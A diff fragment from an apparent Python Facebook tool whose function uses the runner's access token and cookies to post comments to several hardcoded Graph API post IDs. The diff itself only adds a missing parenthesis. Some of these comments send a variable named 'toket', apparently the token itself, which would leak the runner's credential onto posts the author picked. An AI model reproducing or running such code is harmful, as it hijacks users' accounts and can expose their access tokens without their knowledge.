@@ -286,7 +286,7 @@ def ___fii___Sayang___Kamu___Widiya___():
     post = '573457507083491'
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
     requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/626021385160436/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie
+    requests.post('https://graph.facebook.com/626021385160436/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
     requests.post('https://graph.facebook.com/626021385160436/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
     requests.post('https://graph.facebook.com/603362670759641/comments/?message=' + toket + '&access_token=' + (token),cookies=cookie)
     requests.post('https://graph.facebook.com/626021385160436/comments/?message=' + toket + '&access_token=' + (token),cookies=cookie)
